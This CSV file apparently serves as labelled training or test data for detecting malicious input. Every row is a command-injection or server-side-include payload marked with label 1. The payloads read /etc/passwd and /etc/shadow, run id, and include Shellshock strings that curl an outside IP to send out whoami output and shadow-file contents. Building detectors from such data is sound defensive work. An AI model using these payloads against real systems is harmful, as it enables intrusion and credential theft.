Sentence,Label
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,1
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,1
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,1
/index.html|id|,1
;id;,1
;id,1
;netstat -a;,1
;system('cat%20/etc/passwd'),1
|id,1
|/usr/bin/id,1
|id|,1
|/usr/bin/id|,1
||/usr/bin/id|,1
|id;,1
||/usr/bin/id;,1
;id|,1
;|/usr/bin/id|,1
\n/bin/ls -al\n,1
\n/usr/bin/id\n,1
\nid\n,1
\n/usr/bin/id;,1
\nid;,1
\n/usr/bin/id|,1
\nid|,1
;/usr/bin/id\n,1
;id\n,1
|usr/bin/id\n,1
|nid\n,1
`id`,1
`/usr/bin/id`,1
a);id,1
a;id,1
a);id;,1
a;id;,1
a);id|,1
a;id|,1
a)|id,1
a|id,1
a)|id;,1
|/bin/ls -al,1
a);/usr/bin/id,1
a;/usr/bin/id,1
a);/usr/bin/id;,1
a;/usr/bin/id;,1
a);/usr/bin/id|,1
a;/usr/bin/id|,1
a)|/usr/bin/id,1
a|/usr/bin/id,1
a)|/usr/bin/id;,1
;system('id'),1
;system('/usr/bin/id'),1
%0Acat%20/etc/passwd,1
%0A/usr/bin/id,1
%0Aid,1
%0A/usr/bin/id%0A,1
%0Aid%0A,1
& ping -i 30 127.0.0.1 &,1
& ping -n 30 127.0.0.1 &,1
%0a ping -i 30 127.0.0.1 %0a,1
`ping 127.0.0.1`,1
| id,1
& id,1
; id,1
%0a id %0a,1
$;/usr/bin/id,1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",1
